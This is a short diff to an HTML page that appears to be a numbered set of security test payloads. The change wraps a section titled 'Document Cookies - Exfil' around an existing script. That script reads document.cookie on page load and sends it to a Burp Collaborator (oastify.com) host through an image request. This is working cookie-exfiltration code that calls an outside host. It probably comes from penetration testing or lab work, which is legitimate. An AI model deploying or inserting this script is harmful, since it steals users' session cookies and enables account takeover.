@@ -103,12 +103,15 @@
   }
 </script>
    <!-- 9. Send Cookies to the Collab-->
-  <script>
+  <section>
+    <h2>🍪 Document Cookies - Exfil</h2> 
+    <script>
   const exfil = "t2wenwq764pqivxdk8vsvmw7eykp8mwb.oastify.com"; // Replace with your Burp Collaborator domain
 
   if (document.cookie) {
     new Image().src = "http://" + exfil + "/?" + "cookie=" + document.cookie;
   }
-</script>
+    </script>
+  </section>
 </body>
 </html>
